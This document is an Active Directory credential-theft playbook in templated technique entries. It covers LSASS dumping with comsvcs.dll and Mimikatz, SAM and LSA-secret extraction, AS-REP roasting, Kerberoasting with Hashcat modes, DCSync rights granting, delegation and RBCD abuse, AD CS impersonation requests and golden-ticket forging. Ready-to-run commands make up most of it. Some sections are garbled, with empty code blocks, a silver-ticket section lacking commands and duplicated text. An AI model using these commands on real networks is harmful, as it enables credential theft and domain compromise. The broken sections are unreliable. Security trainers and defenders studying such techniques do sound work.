title: Obtain accessible live logon-session credential material
clue: A controlled Windows host may hold useful logged-on identities
conditions: Required process/host privileges, useful sessions and compatible architecture; PPL/Credential Guard/protection may prevent access or remove material
access: A domain identity, appropriate host privilege, or a validated effective directory-object right
result: Typed password/hash/key/ticket artifacts from accessible logon sessions
mechanics: LSASS material depends on logon type, authentication package, session lifetime and protection. Administrator membership alone does not guarantee readable credentials or plaintext passwords.
checks:
```cmd
whoami /all
query user
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```
example: Observation: a privileged user had a session on a controlled host. Test: validate current session and protection state before the appropriate collection method. Illustrative output: an NT hash is available but no plaintext password. Interpretation: classify it and select a compatible authorized service.
verify: Tie each artifact to an account, source/logon session and material type; independently validate any useful reuse.
failure: Protected process access denial, absent sessions and unsupported parsing are different outcomes. Prefer an accessible ticket or other matched source when available.

recognition.where: On the verified controlled host inspect current token, logged-on session evidence and protection configuration before choosing a credential source.

| Source | What it can contain | Typical prerequisite | Result is not automatically |
| --- | --- | --- | --- |
| Current ticket cache | TGTs and service tickets for the current logon session | Current user; other LUIDs normally require elevation | A password, NT hash or authorization to every service |
| LSASS memory/dump | Logon-session NTLM/AES/DPAPI material and tickets, depending on OS/protection/logon type | Administrator/SYSTEM, suitable debug/dump access, compatible architecture | Guaranteed cleartext or every user's reusable secret |
| SAM + SYSTEM | Local account password hashes | Administrator/SYSTEM/backup-capable access to matched hives | Domain-account material |
| SECURITY + SYSTEM | LSA secrets, service/machine secrets, cached domain verifiers | Administrator/SYSTEM/backup-capable access to matched hives | Directly passable cached-domain hashes |
| Credential Manager/DPAPI | Targeted saved credentials and protected application data | Suitable user/machine context plus master-key material | Plaintext merely because a blob/file is readable |

| DRS replication | Selected domain-account secrets | Effective replication rights at the domain root | Local admin, DC service access or Domain Users membership |

```cmd
whoami /all
tasklist /fi "imagename eq lsass.exe"
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard /v LsaCfgFlags
```

```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object SecurityServicesConfigured,SecurityServicesRunning,VirtualizationBasedSecurityStatus
```

Interpretation:

- membership in Administrators with a medium-integrity filtered token is not equivalent to an elevated process;
- `SeDebugPrivilege` must be present and usable for common live-process access;
- a missing registry value is not definitive proof that a protection is disabled because defaults, policy and firmware state matter;
- LSA protection blocks untrusted code injection/process-memory access; Credential Guard isolates selected NTLM, Kerberos and saved-domain secrets with VBS;
- EDR/AV can block a tool or dump path without proving the underlying credential source is empty.

An access-denied or empty result disproves only that method in the current context.

##### Direct Mimikatz access

```text
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
```

Decisive output is a named logon session with a typed value: NTLM, AES key, DPAPI key or ticket. A username with `Password : (null)` is not a failed tool run when another useful field exists, and modern Windows commonly does not retain reusable cleartext.

##### Dump first, parse offline

Built-in `comsvcs.dll` method from an elevated command prompt:

```cmd
for /f "tokens=2" %A in ('tasklist ^| findstr /i lsass.exe') do rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %A C:\Windows\Temp\lsass.dmp full
```

Sysinternals ProcDump alternative:

```cmd
procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

Parse with a compatible Mimikatz build:

```text
mimikatz.exe
sekurlsa::minidump C:\Path\To\lsass.dmp
sekurlsa::logonpasswords
sekurlsa::tickets
```

Common failures:

- dump creation denied: token/protection/EDR or process-access prerequisite failed;
- `ProcessorArchitecture` mismatch: use compatible x64/x86 tooling;
- OS major-version mismatch: parse with a compatible build/environment;
- dump succeeds but secrets are absent: logon type, sign-out/reboot, Credential Guard and provider behavior affect contents.

LSASS dumps are sensitive and noisy. Hash the evidence if needed, transfer through the established route, store it privately and remove the target copy after the authorized objective.

```powershell
Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesConfigured,DeviceGuardSecurityServicesRunning
```

Credential Guard can isolate reusable domain secrets from ordinary LSASS memory. It does not erase local SAM, file, vault, DPAPI, ticket, service-configuration or directory-right paths. One failed dump method disproves only that method and context. Intrusive SSP interception changes system state and waits for a future logon; it is not the default Block 5 response.

title: Extract local account hashes from matched SAM and SYSTEM
clue: Protected local registry material is available under sufficient host privilege
conditions: Matched SAM/SYSTEM from the same system and appropriate read/backup access
access: A domain identity, appropriate host privilege, or a validated effective directory-object right
result: Local-account NT hashes with source-machine context
mechanics: SAM stores local account verifiers protected using key material derived from SYSTEM. These are local identities; a same-named domain account is a different principal.
checks:
```cmd
whoami /priv
reg save HKLM\SAM C:\Windows\Temp\SAM.save
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.save
```
example: Observation: a backup-capable context obtains both hives. Test: parse the matched files offline. Illustrative output: a local administrator hash is recovered. Interpretation: test only justified local-account reuse with explicit target-local qualification.
verify: Verify source machine, matched hive pair and account/RID mapping; validate destination rights separately.
failure: Mismatched/incomplete hives or denied backup operations require source repair. Local hashes do not automatically grant domain access.

recognition.where: At a host context with justified protected-file access inspect current privileges and the source machine before selecting matched registry material.
recognition.sample:
Host: TARGET_HOST
Relevant backup/read privilege: present
Needed pair: SAM plus matching SYSTEM
recognition.spot: Sufficient source access suggests local-account extraction, not domain-account extraction.
recognition.confirm: Verify a supported backup/read operation, complete same-host hives and offline parser context.
recognition.enabled: The matched local pair is available and parses correctly: classify the returned local hashes.
recognition.ruledout: Only unrelated/mismatched hives are available: reject parsing them as a consistent pair.
recognition.unknown: A privilege name alone does not establish the artifacts can be obtained.

procedure:
```cmd
reg save HKLM\SAM C:\Windows\Temp\SAM.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
```

```bash
impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
```

Mimikatz alternative from a suitable elevated context:

```text
privilege::debug
token::elevate
lsadump::sam
```

Interpret a typical account row as:

```text
LOCAL_USER:RID:LM_HASH:NT_HASH:::
```

The NT hash is local-account material. Its reuse depends on the same local password existing elsewhere, account state, remote UAC restrictions, service support and host authorization. Return it to the credential-classification workflow; do not call it a domain credential.

title: Extract LSA secrets and cached-domain verifiers
conditions: Appropriate host/read privilege and complete matching key/source files
access: A domain identity, appropriate host privilege, or a validated effective directory-object right
result: Typed LSA secrets, machine/service credentials or cached logon verifiers
mechanics: Different SECURITY records encode different capabilities. DCC2 is an offline verifier; a machine-account secret and a service password have different identities and compatible uses.
checks:
```cmd
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.save
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.save
```
example: Observation: offline parsing yields both a cached logon verifier and a service secret. Test: classify each output independently. Illustrative output: DCC2 needs recovery while the service password can be validated directly. Interpretation: choose separate next methods.
verify: Retain source, account, type and required factors; do not label every parsed output a Pass-the-Hash credential.
failure: Absent cached entries or protected secrets are source-specific limitations; use another justified credential source.

recognition.where: Inspect the rights and origin of a protected registry backup and distinguish SECURITY data from SAM before collection/parsing.
recognition.sample:
Available snapshot: SECURITY.save
Matching SYSTEM.save: verify
Expected outputs: LSA secrets and cached logon records
recognition.spot: A SECURITY source targets secrets/cached verifiers with distinct semantics; it is not simply another SAM.
recognition.confirm: Confirm matched key material and classify every returned service/machine secret or DCC2 record.
recognition.enabled: A complete matched source yields usable typed material: choose its type-specific next method.
recognition.ruledout: The SYSTEM file comes from another snapshot/machine: reject that consistency assumption.
recognition.unknown: An empty parser result with incomplete source/context leaves credential absence unproved.

procedure:
```cmd
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
```

```bash
impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL
```

Mimikatz alternative:

```text
privilege::debug
token::elevate
lsadump::secrets
lsadump::cache
```

Potential categories:

- `$MACHINE.ACC`: member computer's domain-account secret/key material;
- service/autologon secrets: usefulness depends on whether the service/account remains active;
- `NL$1`-style cached logon data: DCC2/MSCache v2 verifier material.

DCC2 is for offline guessing, not Pass-the-Hash:

```bash
hashcat -m 2100 dcc2.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

Verify the exact format with the installed Hashcat examples before cracking.

title: Request AS-REP material for an account without preauthentication
clue: A known user or directory flag indicates Kerberos preauthentication is disabled
conditions: Account with preauthentication disabled, KDC reachability and a supported returned encryption type; no-password and authenticated-discovery contexts differ
access: A known domain username for a password-free request, or an authenticated bind for directory-backed discovery
result: A correctly formatted offline password-recovery artifact
mechanics: Without preauthentication, the KDC can return an encrypted AS response whose relevant part permits offline guessing of the account's password-derived key. Receiving it does not reveal the password.
example: Observation: an account is marked without preauthentication. Test: request only its AS-REP material. Illustrative output: a supported hash-format response returns. Interpretation: use the format's correct offline mode and validate any recovered password.
verify: Verify the account, realm, response format/encryption type and recovered credential if cracking succeeds.
failure: Preauthentication-required disproves this method for that account; unknown user, route and clock failures have different meanings.

recognition.where: With an authenticated directory view inspect userAccountControl; without a bind, use only the documented known-user/no-password KDC path and distinguish its replies.
recognition.spot: The DONT_REQUIRE_PREAUTH bit is set. Test the bit, not equality to one whole decimal value, because other flags coexist.
recognition.confirm: Check account state, KDC route, response/encryption type and feasible recovery; no-password discovery requires a real known username.
recognition.enabled: The selected enabled account returns the supported AS-REP artifact: choose its offline recovery path.
recognition.ruledout: The KDC requires preauthentication for that account: reject AS-REP roasting for that identity.
recognition.unknown: An unknown user or KDC timeout says nothing about the preauthentication setting.

procedure:
##### Why AS-REP roasting works

Ordinary Kerberos preauthentication makes the user prove knowledge of the long-term key before the KDC returns AS-REP material. If the account has `DONT_REQUIRE_PREAUTH`, an unauthenticated requester can ask for an AS-REP whose encrypted component can be tested offline against password candidates.

```text
KNOWN USERNAME + PREAUTH DISABLED + KDC REACHABLE
-> AS-REP CIPHER
-> OFFLINE GUESSING
-> PASSWORD ONLY IF A CANDIDATE VERIFIES
```

##### One known user, no password

```bash
impacket-GetNPUsers 'DOMAIN/TARGET_USER' -no-pass -request \
  -dc-ip DC_IP -outputfile asrep-TARGET_USER.hashes
```

##### Supplied user list, no password

```bash
impacket-GetNPUsers 'DOMAIN/' -no-pass -request -usersfile users.txt \
  -dc-ip DC_IP -outputfile asrep.hashes
```

##### Authenticated directory-backed discovery

```bash
impacket-GetNPUsers 'DOMAIN/USER' -request \
  -dc-ip DC_IP -outputfile asrep.hashes
```

Omitting the password from the target lets the tool prompt rather than storing it in shell history.

##### Windows/Rubeus alternative

```cmd
Rubeus.exe asreproast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:asrep.hashes /format:hashcat
```

##### Interpret before cracking

| Output | Meaning | Next action |
| --- | --- | --- |
| `$krb5asrep$23$` | RC4 AS-REP offline verifier | Hashcat mode 18200 |
| AS-REP with another etype | Different cipher/format | Match the exact prefix to installed Hashcat/John support |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User/realm not found | Recheck spelling, realm and DC |
| Preauthentication required / no `UF_DONT_REQUIRE_PREAUTH` | Account is not roastable through this method | Disprove this path for that account |
| Timeout/name error | KDC route/DNS problem | Fix route/FQDN/time before account conclusions |

```bash
hashcat -m 18200 asrep.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 18200 asrep.hashes --show
```

Do not call the account compromised because a hash was captured. Only a verified offline candidate produces a password, and that password still needs identity/access mapping.

title: Request a selected service ticket for offline service-account recovery
clue: A user-owned SPN and a useful service-account relationship
conditions: A valid domain authentication/TGT context, reachable KDC, target SPN and a feasible password/encryption candidate strategy
access: A domain identity, appropriate host privilege, or a validated effective directory-object right
result: A selected TGS recovery artifact and possibly a recovered service-account password
mechanics: The service ticket is encrypted with the service account's long-term key. Request permission does not equal service administration, and strong machine/account keys can make recovery infeasible.
example: Observation: a service account owns a relevant SPN. Test: enumerate first and request only that selected account's ticket. Illustrative output: a supported encryption-type artifact is obtained. Interpretation: apply its matching recovery mode and evaluate the account's actual rights.
verify: Record SPN/account/encryption type and verify any recovered password against the intended identity.
failure: No crack means only the tried candidates failed; a ticket request does not prove a weak password or host access.

procedure:
##### Why Kerberoasting works Any valid domain identity can normally request a service ticket for an SPN. The ticket is encrypted with key material belonging to the SPN account, allowing offline password guessing. ```text VALID DOMAIN IDENTITY + SPN ACCOUNT + KDC ROUTE -> TGS-REP CIPHER -> OFFLINE GUESSING -> SERVICE-ACCOUNT PASSWORD IF A CANDIDATE VERIFIES ``` Rank SPN accounts before requesting tickets: group/ACL value, service/host, account type, password age, enabled state and resulting access matter more than collecting every ticket. ##### Enumerate without requesting tickets ```bash impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /stats /domain:DOMAIN /dc:DC_HOST ``` ##### Request one selected user ```bash impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \ -outputfile kerberoast-TARGET_USER.hashes 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes ```
Request all mapped candidates ```bash impacket-GetUserSPNs -request -dc-ip DC_IP \ -outputfile kerberoast.hashes 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes ``` Use broad requests only when scope and the candidate inventory justify them. Prefer one ranked account during verification.
##### Hash type and cracking | Prefix | Kerberos etype | Hashcat mode | | --- | ---: | ---: | | `$krb5tgs$23$` | RC4-HMAC | 13100 | | `$krb5tgs$17$` | AES128 | 19600 | | `$krb5tgs$18$` | AES256 | 19700 | ```bash hashcat -m 13100 kerberoast.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19600 kerberoast-aes128.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19700 kerberoast-aes256.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m MODE HASH_FILE --show ``` Select the mode from the actual prefix and current `hashcat --example-hashes`; do not assume every TGS is RC4. AES material is still an offline verifier but generally costs more per guess. Cracking feasibility is governed mainly by password strength and candidates, not merely ticket acquisition. ##### Common failures - no SPNs returned: wrong domain/base/authentication context, filtering or no user SPNs; - `KDC_ERR_S_PRINCIPAL_UNKNOWN`: SPN is absent/malformed or queried in the wrong realm; - `KDC_ERR_ETYPE_NOSUPP`: requested cipher conflicts with account/domain policy; - output wraps or fails to load: save directly to an output file and verify prefix/line integrity; - crack exhausts candidates: password not represented by the tested model; the account is not therefore “secure.”

clue: A service account key and a concrete compatible service/SPN objective
conditions: Correct service key/encryption type, domain SID, principal/SPN data and service validation behavior; modern PAC/KDC validation can constrain use
access: A domain identity, appropriate host privilege, or a validated effective directory-object right
result: A verified authentication effect limited to the compatible service context
mechanics: A silver ticket is encrypted for a service account rather than issued through a new domain TGT. Its acceptance depends on service/PAC validation; it is not universal domain-administrator authority.
example: Observation: a known service key and domain SID are available. Test: match the intended SPN and documented acceptance conditions. Illustrative output: a CIFS operation succeeds under the crafted ticket while WinRM does not. Interpretation: retain the exact service scope.
verify: Prove the intended service action and ticket context; ticket creation/import success alone is insufficient.
failure: Wrong key/SPN/SID or modern validation can reject the ticket. Prefer an existing valid credential/TGT route when enabled.

> **Prerequisite:** key/hash of the account encrypting the target SPN's tickets, domain SID, exact SPN/service/host, a plausible existing domain identity and compatible target-service validation behavior.


Despite the Mimikatz module name, supplying a service/target key produces a silver/service ticket, not a krbtgt-signed TGT.

Important boundaries:

- the key must belong to the account that owns the SPN; machine-account keys commonly protect host services;
- the ticket is limited to the named service/host and whichever services share the same account key;
- current PAC enforcement means using a nonexistent identity can fail; use a real authorized test identity and validate behavior;
- a service may perform KDC/PAC validation or additional authorization;

clue: A principal has the relevant effective replication rights at the domain naming context
conditions: Required replication extended rights, DC RPC connectivity and correct domain identity; access to a member server is insufficient
access: A domain identity, appropriate host privilege, or a validated effective directory-object right
result: Selected domain credential material retrieved through directory replication
mechanics: DCSync uses the replication protocol instead of reading a local LSASS process or copying NTDS. Its authorization comes from domain replication rights, not an arbitrary local administrator token.
example: Observation: a controlled identity has the required domain replication rights. Test: verify effective rights and request only the selected proof account through the documented mechanism. Illustrative output: that account's credential material returns. Interpretation: classify and retain it privately.
verify: Verify the replication source, account and material type; avoid equating a tool label with proven rights.
failure: RPC route, identity context and missing replication rights produce different failures; verify each prerequisite.

recognition.sample:
Applicable domain ACEs:
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
Trustee: CONTROLLED_PRINCIPAL
recognition.spot: Replication rights at the domain scope are the relevant clue; local administrator rights on a member host are different.
recognition.confirm: Verify the complete effective replication rights for selected data, trustee membership, DC/RPC route and identity context.
recognition.enabled: The required rights and route produce the bounded selected-account proof: choose DRS replication.
recognition.ruledout: The ACE applies only to a user/OU or lacks required replication rights: reject DCSync.
recognition.unknown: Unresolved GUIDs or RPC filtering leave rights/access separately unknown.

procedure:
> **Prerequisite:** effective domain-root rights equivalent to `Replicating Directory Changes` plus `Replicating Directory Changes All` (and filtered-set rights where applicable). Domain membership or local admin on an ordinary host is insufficient.

Validate ACLs at the domain root:

```powershell
Get-DomainObjectAcl -Identity 'DC=DOMAIN,DC=TLD' -ResolveGUIDs |
  Where-Object { $_.ObjectAceType -match 'Replication-Get-Changes' }
```

A controlled DACL transition can grant these rights, but doing so changes the domain security descriptor and creates a domain-compromise path:

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose

# Remove the delegated replication ACE after the authorized objective
Remove-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose
```

Local administrator rights on a member host, an LDAP bind or a valid Kerberos ticket do not supply replication rights. Re-read the effective domain-root ACL before and after a change.

Request one approved test account rather than dumping the directory:

```bash

  'DOMAIN/USER:PASSWORD@DC_HOST'
```

```text

```

family: Conditional policy, delegation and certificate paths
clue: A useful linked GPO has a potentially controllable directory or SYSVOL component
conditions: Effective rights on the necessary GPO components, applicable target scope/filtering, writable policy artifact and a privileged refresh trigger
access: A domain identity, appropriate host privilege, or a validated effective directory-object right
result: A verified policy-backed privileged action on an in-scope host
mechanics: GPO control spans directory objects, files, links and client-side processing. A writable GPO object alone does not prove that the intended host consumes the chosen setting.
example: Observation: a group controls a GPO linked to an OU. Test: validate both policy components and actual target applicability. Illustrative output: security filtering excludes the target. Interpretation: the proposed policy-to-host chain is not enabled.
verify: Verify actual policy application and resulting privileged effect; retain/restorable original policy state.
failure: Wrong link, filtering, unavailable refresh or missing file rights invalidates the chain. Keep this as a conditional supplement.

gPLink: POLICY_GUID

recognition.spot: A linked policy supplies a potential privileged consumer only for hosts to which it actually applies.
recognition.confirm: Check both needed policy components, effective ACEs, security/WMI filtering, target scope and refresh trigger.
recognition.enabled: The controlled policy is consumed on the intended host and effect verified: choose this conditional route.
recognition.ruledout: The target is excluded by policy filtering: reject that policy-to-host chain.

Identify GPOs and links:

```powershell

Get-DomainOU | Select-Object name,distinguishedname,gplink
Get-DomainObjectAcl -SearchBase 'CN=Policies,CN=System,DC=DOMAIN,DC=TLD' -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteProperty' }
```

2. the GPO is linked to the OU containing the intended test host/user;
3. security filtering and WMI filters include that subject;
4. the configured preference/task/script runs in the expected context; and
5. policy refresh or another predictable trigger will occur.

procedure:
Enumerate before attempting any ticket operation:

```powershell
Get-DomainComputer -Unconstrained | Select-Object dnshostname
Get-DomainUser -TrustedToAuth | Select-Object samaccountname
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname
Get-DomainObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties samaccountname,msds-allowedtodelegateto
```

```bash
impacket-findDelegation 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP
```

Constrained delegation/S4U requires control of the delegated account/key and an allowed SPN:

```bash
impacket-getST -spn ALLOWED_SPN -impersonate AUTHORIZED_TEST_USER \
  -dc-ip DC_IP 'DOMAIN/DELEGATED_USER:PASSWORD'
export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
```

Use the ticket only for the approved service/host. Unconstrained delegation can expose forwarded/cached tickets, but coercing authentication changes another host's behavior and is not a baseline. Validate only in a disposable authorized lab and protect ticket material.

##### Resource-based constrained delegation

> **Prerequisite:** effective write control over the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` plus control of a principal with an SPN (often a lab computer account).

```bash
impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \
  -computer-pass 'LAB_MACHINE_PASSWORD' -dc-host DC_HOST -dc-ip DC_IP

impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \
  -action write -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'

impacket-getST -spn cifs/TARGET_HOST -impersonate AUTHORIZED_TEST_USER \
  -dc-ip DC_IP 'DOMAIN/LABCOMPUTER$:LAB_MACHINE_PASSWORD'
```

Cleanup after the lab objective:

```bash
impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \
  -action remove -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'
impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \
  -delete -dc-ip DC_IP
```

Machine-account quota, computer-object rights, DNS/SPN naming and target service authorization are separate prerequisites.

procedure:
> **Prerequisite:** reachable CA/DC and a valid domain identity. **Decisive output:** a CA/template whose enabled state, enrollment rights and configuration satisfy a specific ESC path.

Package names vary:

```bash
command -v certipy-ad || command -v certipy
certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -enabled -vulnerable -stdout
```

Review:

- CA name and host;
- template name and whether it is enabled/published;
- who can enroll;
- client-authentication EKUs/purpose;
- subject/SAN supply controls;
- manager approval/signature requirements;
- template owner and modification rights;
- web enrollment/relay-related configuration where relevant.

An `ESC` label is a candidate classification. Manually validate the properties and the controlled identity's effective rights.

Generic request after validating a specific template:

```bash
certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -target DC_HOST -ca CA_NAME -template TEMPLATE
```

An alternate UPN/SID request is appropriate only when the validated template permits it and the lab explicitly authorizes impersonation testing:

```bash
certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -target DC_HOST -ca CA_NAME -template TEMPLATE \
  -upn 'TEST_USER@DOMAIN' -sid 'TEST_USER_SID'
```

```bash
certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
```

Treat PFX files, tickets and returned hashes as credentials. Verify certificate subject/SID, validity and intended identity. A successful issuance is not the same as successful PKINIT authentication.

Before any authorized template change, save configuration:

```bash
certipy-ad template -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -template TEMPLATE -save-configuration template-backup.json
```

Template writes alter Active Directory configuration and may affect many principals. Use only an explicitly authorized disposable lab path, inspect `certipy-ad template -h` for the installed version, and restore the saved configuration after the demonstration.

procedure:
Golden tickets require the domain SID and KRBTGT key. They are persistence/impact concepts, not a default Block 11 action. A forged ticket still depends on correct cryptographic material, realm, time and authorization. klist

Golden tickets require the domain SID and KRBTGT key. They are persistence/impact concepts, not a default Block 11 action. A forged ticket still depends on correct cryptographic material, realm, time and authorization. For the active service-scoped case, use Silver tickets.

Authorized isolated-lab examples:

# Golden: realm-wide TGT material
impacket-ticketer -nthash KRBTGT_NT_HASH -domain-sid DOMAIN_SID \
  -domain DOMAIN AUTHORIZED_TEST_USER

export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
klist

Use only against the approved service/host, record ticket metadata and remove generated credentials afterward. Domain recovery after KRBTGT exposure generally requires coordinated credential rotation and replication convergence; service-ticket exposure requires rotating the affected service/machine secret and reviewing access.
